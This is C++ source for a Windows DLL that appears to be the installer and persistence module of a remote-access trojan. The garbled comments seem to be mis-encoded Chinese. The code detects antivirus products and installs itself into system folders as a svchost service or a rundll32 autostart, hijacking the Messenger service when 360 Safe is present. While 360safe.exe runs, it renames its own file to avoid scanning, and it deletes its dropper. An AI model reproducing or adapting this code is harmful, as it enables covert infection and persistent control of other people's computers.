
#include "stdafx.h"
#include "MyWorkMoudle.h"

SERVICE_STATUS_HANDLE	hService  = 0;	
SERVICE_STATUS			SrvStatus = {0};

CMyFunc	  m_gFunc;
UINT	  m_Ext_A[3] = {PS_EXT_A, PS_EXT_B, PS_EXT_C};
HINSTANCE m_ghInstance = NULL;
PSDLLINFO m_DllInfo = {0};

BOOL APIENTRY DllMain(HANDLE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	if(DLL_PROCESS_ATTACH == ul_reason_for_call)
	{
		m_ghInstance = (HINSTANCE) hModule;
		WSADATA	data = {0};
		WSAStartup(MAKEWORD(2, 2), &data);
	}
    return TRUE;
}

void DoRundll32_RavWork(char* pDesFilePath)
{
//	_asm int 3;

	//�޸������������
	m_DllInfo.m_DllStartCmd = PS_NORMAL_RUNDLL32;
	CopyMyFileToDesDir(pDesFilePath);

	//ServiceMain
	char m_FuncName[256] = {0};
	m_gFunc.GetMyString(10198, m_FuncName, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//\"%s\",%s
	char m_SprintStr[256] = {0};
	m_gFunc.GetMyString(10235, m_SprintStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//rundll32.exe
	char m_RunDll32Str[256] = {0};
	m_gFunc.GetMyString(10236, m_RunDll32Str, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//����rundll32.exe����ģ��
	TCHAR m_Text[256] = {0};
	m_gFunc.sprintf(m_Text, m_SprintStr, pDesFilePath, m_FuncName);

	//����Ŀ��ģ��
	m_gFunc.ShellExecute(NULL, NULL, m_RunDll32Str, m_Text, NULL, SW_SHOW);
}

//��װ������
void InstallDll()
{
	//����ɱ�����
	CheckKillSoft();

	//�ͻ�Ψһ��ʶ
	if(m_gFunc.memcmp(m_DllInfo.m_ID, m_DllInfo.m_ExeFilePath, 16) == 0)
	{
		m_gFunc.CoCreateGuid((GUID*) m_DllInfo.m_ID);
	}

	//ȡEXE�ļ�����
	m_gFunc.GetModuleFileName(NULL, m_DllInfo.m_ExeFilePath, 255);

	//SystemRoot
	char m_SystemRootStr[256] = {0};
	m_gFunc.GetMyString(10241, m_SystemRootStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//%s\\System32\\%s.dll
	char m_System32SprintfStr[256] = {0};
	m_gFunc.GetMyString(10242, m_System32SprintfStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//CommonProgramFiles
	char m_CommonProgramFilesStr[256] = {0};
	m_gFunc.GetMyString(10243, m_CommonProgramFilesStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//%s\\Microsoft Shared\\%s.dll
	char m_MicrosoftSharedSprintfStr[256] = {0};
	m_gFunc.GetMyString(10244, m_MicrosoftSharedSprintfStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//��װĿ¼
	char m_ImagePathSrc[MAX_PATH] = {0};
	char m_DesPath[256] = {0};
	if(m_DllInfo.m_DirAddr == 0)
	{
		m_gFunc.GetEnvironmentVariable(m_SystemRootStr, m_DesPath, 255);
		m_gFunc.sprintf(m_ImagePathSrc, m_System32SprintfStr, m_DesPath, m_DllInfo.m_ServiceName);
	}
	else
	{
		m_gFunc.GetEnvironmentVariable(m_CommonProgramFilesStr, m_DesPath, 255);
		m_gFunc.sprintf(m_ImagePathSrc, m_MicrosoftSharedSprintfStr, m_DesPath, m_DllInfo.m_ServiceName);
	}

#ifdef PS_VER_DINGZUO
	if(m_DllInfo.m_KillSoft == _KILL_360)
	{
		//��360��������
		Make360StartInfo();
		return;
	}
#endif

	if(m_DllInfo.m_KillSoft != _KILL_RAV)
	{
		//��ͨ������ʽ�������κ���������
		CopyMyFileToDesDir(m_ImagePathSrc);

		//��װ��������
		if(!MakeService())
		{
			//��ע���run����
			m_DllInfo.m_KillSoft = _KILL_RAV;
		}
	}

	if(m_DllInfo.m_KillSoft == _KILL_RAV)
	{
		//ע���run�������ܹ�������������
		DoRundll32_RavWork(m_ImagePathSrc);
		MakeRavStartInfo(m_ImagePathSrc);
	}
}

void WINAPI ServiceMain(ULONG dwArgc, LPTSTR* lpszArgv)
{
//	_asm int 3;

	//ȡ����
	DWORD nCmd = 0;
	if(dwArgc == DLL_LOAD_FLAG)
	{
		//pcinit.exe������������
		nCmd = *((DWORD*) lpszArgv[0]);
	}

	//�����ִ���
	BYTE* pModule = NULL;
	if(nCmd == DLL_START_INSTALL)
	{
		pModule = (BYTE*) lpszArgv[1];
	}
	else
	{
		pModule = (BYTE*) m_ghInstance;
	}
	if(!m_gFunc.LoadMyData(pModule))
	{
		return;
	}

	//����ȫ�ֲ���
	if(nCmd == DLL_START_INSTALL)
	{
		//��pcinit.exe����
		m_gFunc.memcpy(&m_DllInfo, lpszArgv[2], sizeof(m_DllInfo));
	}
	else
	{
		//��������ȡ����ȫ����Ϣ
		if(!GetFileSaveInfoFromMoudle())
		{
			return;
		}
	}

	//rundll32.exe
	char m_RunDll32Str[256] = {0};
	m_gFunc.GetMyString(10236, m_RunDll32Str, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//svchost.exe
	char m_SvchostStr[256] = {0};
	m_gFunc.GetMyString(10246, m_SvchostStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//�鿴������ʽ
	char m_ModuleFilePath[256] = {0};
	m_gFunc.GetModuleFileName(NULL, m_ModuleFilePath, 255);
	m_gFunc.CharLower(m_ModuleFilePath);

	if(m_gFunc.strstr(m_ModuleFilePath, m_RunDll32Str) != NULL)		//rundll32.exe����
	{
		if(m_DllInfo.m_DllStartCmd == PS_NORMAL_RUNDLL32)
		{
			//�������ӹ����߳�
			m_gFunc.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE ) DoMainWorkThread, (LPVOID) m_gFunc.GetCurrentThreadId(), 0, NULL);

			//�ȴ��߳��˳�
			MSG msg;
			while(m_gFunc.GetMessage(&msg, 0, 0, 0))
			{
				if(WM_CLOSE_CLIENT_THREAD == msg.message)
				{
					break;
				}
 			}
		}

#ifdef PS_VER_DINGZUO
		else if(m_DllInfo.m_DllStartCmd == PS_NORMAL_360_MAKE_REG)
		{
			//%sreg.reg
			char m_RegFileSprintfStr[256] = {0};
			m_gFunc.GetMyString(10239, m_RegFileSprintfStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

			//-s \"%s\"
			char m_SprintfStr[256] = {0};
			m_gFunc.GetMyString(10247, m_SprintfStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

			//regedit.exe
			char m_RegeditStr[256] = {0};
			m_gFunc.GetMyString(10248, m_RegeditStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

			//�޸�ע���
			char m_RegFileName[256] = {0};
			m_gFunc.GetTempPath(200, m_RegFileName);
			m_gFunc.sprintf(m_RegFileName + m_gFunc.strlen(m_RegFileName), m_RegFileSprintfStr, m_DllInfo.m_ServiceName);
			char m_Cmdlines[256] = {0};
			m_gFunc.sprintf(m_Cmdlines, m_SprintfStr,  m_RegFileName);
			m_gFunc.ShellExecute(NULL, NULL, m_RegeditStr, m_Cmdlines, NULL, SW_SHOW);

			//�����ļ���Ŀ¼

			//SystemRoot
			char m_SystemRootStr[256] = {0};
			m_gFunc.GetMyString(10241, m_SystemRootStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

			//%s\\System32\\%s.dll
			char m_System32SprintfStr[256] = {0};
			m_gFunc.GetMyString(10242, m_System32SprintfStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

			//CommonProgramFiles
			char m_CommonProgramFilesStr[256] = {0};
			m_gFunc.GetMyString(10243, m_CommonProgramFilesStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

			//%s\\Microsoft Shared\\%s.dll
			char m_MicrosoftSharedSprintfStr[256] = {0};
			m_gFunc.GetMyString(10244, m_MicrosoftSharedSprintfStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

			//��װĿ¼
			char m_ImagePathSrc[MAX_PATH] = {0};
			char m_DesPath[256] = {0};
			if(m_DllInfo.m_DirAddr == 0)
			{
				m_gFunc.GetEnvironmentVariable(m_SystemRootStr, m_DesPath, 255);
				m_gFunc.sprintf(m_ImagePathSrc, m_System32SprintfStr, m_DesPath, m_DllInfo.m_ServiceName);
			}
			else
			{
				m_gFunc.GetEnvironmentVariable(m_CommonProgramFilesStr, m_DesPath, 255);
				m_gFunc.sprintf(m_ImagePathSrc, m_MicrosoftSharedSprintfStr, m_DesPath, m_DllInfo.m_ServiceName);
			}

			m_gFunc.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE ) DoMainWorkThread, (LPVOID) m_gFunc.GetCurrentThreadId(), 0, NULL);

			//�ȴ����ʧЧ
			m_gFunc.Sleep(30000);

			//�����ļ���Ŀ¼
			char m_ModuleName[256] = {0};
			m_gFunc.GetModuleFileName(m_ghInstance, m_ModuleName, 255);
			m_gFunc.CopyFile(m_ModuleName, m_ImagePathSrc, FALSE);

			//�ȴ��߳��˳�
			MSG msg;
			while(m_gFunc.GetMessage(&msg, 0, 0, 0))
			{
				if(WM_CLOSE_CLIENT_THREAD == msg.message)
				{
					break;
				}
 			}
		}
#endif

	}
	else if(m_gFunc.strstr(m_ModuleFilePath, m_SvchostStr) != NULL)	//svchost.exe����
	{
		SrvStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS;
		SrvStatus.dwCurrentState = SERVICE_START_PENDING;
		SrvStatus.dwControlsAccepted = SERVICE_ACCEPT_SHUTDOWN;
		SrvStatus.dwWin32ExitCode = 0;
		SrvStatus.dwServiceSpecificExitCode = 0;
		SrvStatus.dwCheckPoint = 0;
		SrvStatus.dwWaitHint = 0;

		//��������
		char m_ServiceName[256] = {0};
		m_gFunc.strcpy(m_ServiceName, m_DllInfo.m_ServiceName);

#ifdef PS_VER_DINGZUO
	
		if(m_DllInfo.m_KillSoft == _KILL_360)
		{
			//Messenger
			m_gFunc.GetMyString(10294, m_ServiceName, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
		}

#endif

		hService = m_gFunc.RegisterServiceCtrlHandler(m_ServiceName, ServiceCtrl);
		if(hService != NULL) 
		{
			//��ʼ����
			ReportStatus(SERVICE_RUNNING, 0, 0);
			DoMainWork(0);
			ReportStatus(SERVICE_STOPPED, 0, 0);
		}
	}
	else if(DLL_START_INSTALL == nCmd)								//pcinit.exe����
	{
		InstallDll();
	}
}

int ReportStatus(DWORD dState, DWORD dCode, DWORD dwWaitHint)
{
	static DWORD dwCheckPoint = 1;
	SrvStatus.dwControlsAccepted = SERVICE_ACCEPT_SHUTDOWN;
	SrvStatus.dwCurrentState = dState;
	SrvStatus.dwWin32ExitCode = dCode;
	SrvStatus.dwWaitHint = dwWaitHint;
	SrvStatus.dwCheckPoint = 0;
	m_gFunc.SetServiceStatus(hService, &SrvStatus);
	return 1;
}

void WINAPI ServiceCtrl(DWORD code)
{
	switch(code)
	{                           
		case SERVICE_CONTROL_STOP:
			{
				ReportStatus(SERVICE_STOPPED, NO_ERROR, 0);
				return;
			}
		default : break;
	}
	ReportStatus(SrvStatus.dwCurrentState, NO_ERROR, 0);
}

BOOL CheckProcessIsExist(char* sProcessName)
{
	//SeDebugPrivilege
	char m_TmpStr[256] = {0};
	m_gFunc.GetMyString(10217, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	m_gFunc.CharLower(sProcessName);

	//ö�ٵ�ǰϵͳ�����б�
	HANDLE hToken = NULL;  
	TOKEN_PRIVILEGES tkp = {0};   
	m_gFunc.OpenProcessToken(m_gFunc.GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hToken); 
	m_gFunc.LookupPrivilegeValue(NULL, m_TmpStr, &tkp.Privileges[0].Luid); 
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
	m_gFunc.AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES) NULL, 0); 
	DWORD dId[4096] = {0};
	DWORD nSize = 0;
	if(!m_gFunc.EnumProcesses(dId, sizeof(DWORD) * 4096, &nSize))
	{
		return FALSE;
	}

	//�鿴�����б��д˽����Ƿ����
	for(DWORD i = 0; i < nSize / sizeof(DWORD); i++)
	{
		TCHAR m_EnumProcessName[256] = {0};
		GetMoudleMame(dId[i], m_EnumProcessName);
		m_gFunc.CharLower(m_EnumProcessName);

		if(m_gFunc.strstr(m_EnumProcessName, sProcessName) != NULL)
		{
			return TRUE;
		}
	}
	return FALSE;
}

DWORD Monitor360safeThread(LPVOID lPvoid)
{
	char m_SrcFileName[256] = {0};
	m_gFunc.GetModuleFileName(m_ghInstance, m_SrcFileName, 255);

	char m_TmpFileName[256] = {0};
	m_gFunc.strcpy(m_TmpFileName, m_SrcFileName);
	char* pFind = m_gFunc.strrchr(m_TmpFileName, '.');
	*pFind = 0;

	//tmp.dll
	char m_TmpStr[256] = {0};
	m_gFunc.GetMyString(10312, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
	m_gFunc.strcat(m_TmpFileName, m_TmpStr);

	//360safe.exe
	char m_360SafeStr[256] = {0};
	m_gFunc.GetMyString(10310, m_360SafeStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	while(1)
	{
		if(CheckProcessIsExist(m_360SafeStr))
		{
			//�޸�ԭʼ�ļ���
			m_gFunc.MoveFile(m_SrcFileName, m_TmpFileName);

			//�ȴ�360safe�˳�
			while(CheckProcessIsExist(m_360SafeStr))
			{
				m_gFunc.Sleep(50);
			}
			
			//�ָ�ԭʼ�ļ���
			m_gFunc.MoveFile(m_TmpFileName, m_SrcFileName);
		}
		m_gFunc.Sleep(50);
	}
}

void DoMainWork(DWORD nParentThreadId)
{
	//360tray.exe
	char Kill360Str[256] = {0};
	m_gFunc.GetMyString(10220, Kill360Str, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
	if(CheckProcessIsExist(Kill360Str))
	{
		//���360�Ʋ�ɱ
		m_gFunc.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE ) Monitor360safeThread, 0, 0, NULL);
	}

	//ɾ��exe�ļ�
	WIN32_FILE_ATTRIBUTE_DATA m_Data = {0};
	if(m_DllInfo.m_IsDel && m_DllInfo.m_ComFileLen == 0)
	{
		for(int i = 0; i < 10000; i++)
		{
			m_gFunc.DeleteFile(m_DllInfo.m_ExeFilePath);
			if(!m_gFunc.GetFileAttributesEx(m_DllInfo.m_ExeFilePath, GetFileExInfoStandard, &m_Data))
			{
				break;
			}
			m_gFunc.Sleep(1);
		}
	}

	//������������
	CMyWorkMoudle m_WorkModule;
	m_WorkModule.nParentThreadId = nParentThreadId;
	m_WorkModule.DoWork();
}

DWORD DoMainWorkThread(LPVOID lPvoid)
{
	DoMainWork((DWORD) lPvoid);
	return 0;
}



